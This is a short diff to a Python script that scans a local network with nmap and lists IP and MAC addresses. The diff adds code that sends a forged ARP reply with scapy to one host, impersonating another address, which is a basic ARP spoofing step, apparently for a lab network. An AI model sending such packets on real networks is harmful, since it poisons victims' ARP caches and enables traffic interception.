@@ -3,6 +3,7 @@ import os
 import subprocess
 import socket
 import re
+from scapy.all import *
 
 """
 get ip address of host
@@ -71,7 +72,6 @@ if __name__ == "__main__":
 
     result = nmap(ip)
     print(result)
-    print("\n")
 
     # regular expression for IPv4
     ip = re.findall("\d+\.\d+\.\d+\.\d+", result)
@@ -105,3 +105,6 @@ if __name__ == "__main__":
     for i in range(0,len(ip)):
         print("%-18s       %s" % (ip[i],mac[i]))
 
+    packet = ARP(op=2, pdst="192.168.1.106",
+                 hwdst="08:00:27:DF:EF:2C", psrc="192.168.1.104")
+    send(packet)
